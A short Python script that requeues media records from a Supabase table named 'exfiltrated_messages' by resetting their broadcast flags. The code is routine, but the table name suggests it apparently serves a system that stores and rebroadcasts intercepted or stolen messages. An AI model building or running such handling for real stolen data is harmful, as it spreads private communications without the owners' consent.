import sys

sys.path.insert(0, '/app')
import asyncio

from app.core.database import db


async def backfill_all():
    print("Fetching all media records from the beginning of time...")

    # We will fetch IDs in pages of 1000 to bypass Supabase limits
    all_ids = []
    limit = 1000
    offset = 0

    while True:
        res = db.table('exfiltrated_messages') \
            .select('id') \
            .in_('media_type', ['photo', 'document', 'video', 'audio']) \
            .eq('is_broadcasted', True) \
            .range(offset, offset + limit - 1) \
            .execute()

        data = res.data or []
        if not data:
            break

        all_ids.extend([row['id'] for row in data])
        offset += limit
        print(f"Fetched {len(all_ids)} records so far...")

    if not all_ids:
        print("No eligible media found to backfill.")
        return

    print(f"\nFound {len(all_ids)} total media records! Pushing them into the queue in chunks of 50...")

    chunk_size = 50
    total_updated = 0

    for i in range(0, len(all_ids), chunk_size):
        chunk = all_ids[i:i+chunk_size]
        update_res = db.table('exfiltrated_messages') \
            .update({
                'is_broadcasted': False,
                'broadcast_claimed_at': None
            }) \
            .in_('id', chunk) \
            .execute()

        updated_data = update_res.data or []
        total_updated += len(updated_data)

    print(f"\nSuccess! Pushed {total_updated} historical media items back into the queue!")

if __name__ == '__main__':
    asyncio.run(backfill_all())
